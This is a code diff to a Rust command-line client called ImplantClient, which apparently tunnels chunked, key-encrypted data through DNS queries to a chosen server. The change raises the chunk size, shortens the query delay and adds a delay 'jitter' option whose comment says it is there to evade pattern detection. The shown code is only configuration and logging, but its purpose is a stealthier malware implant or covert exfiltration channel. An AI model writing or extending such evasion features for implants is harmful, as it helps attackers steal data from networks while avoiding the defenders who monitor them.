@@ -27,17 +27,22 @@ struct Args {
     #[arg(short, long)]
     server: Option<String>,
 
-    /// Chunk size in bytes (larger = fewer queries, 64-90 recommended)
-    #[arg(long, default_value = "64")]
+    /// Chunk size in bytes (larger = fewer queries, max 90)
+    #[arg(long, default_value = "90")]
     chunk_size: usize,
 
     /// Window size (outstanding chunks, higher = more parallel)
     #[arg(long, default_value = "16")]
     window_size: usize,
 
-    /// Delay between queries in milliseconds (lower = faster but less stealthy)
-    #[arg(long, default_value = "50")]
+    /// Base delay between queries in milliseconds
+    #[arg(long, default_value = "40")]
     delay: u64,
+
+    /// Jitter factor (0.0-1.0) for randomizing delays to evade pattern detection
+    /// 0.5 means delays range from 50% to 150% of base delay
+    #[arg(long, default_value = "0.5")]
+    jitter: f64,
 
     /// Master key (hex encoded, 64 chars = 32 bytes)
     #[arg(short, long)]
@@ -95,9 +100,13 @@ async fn main() -> anyhow::Result<()> {
         chunk_size: args.chunk_size,
         window_size: args.window_size,
         query_delay: Duration::from_millis(args.delay),
+        jitter: args.jitter,
         master_key,
         dns_server,
     };
+
+    tracing::info!("Chunk size: {} bytes", args.chunk_size);
+    tracing::info!("Base delay: {}ms with {:.0}% jitter", args.delay, args.jitter * 100.0);
 
     // Create client
     let client = ImplantClient::new(config);
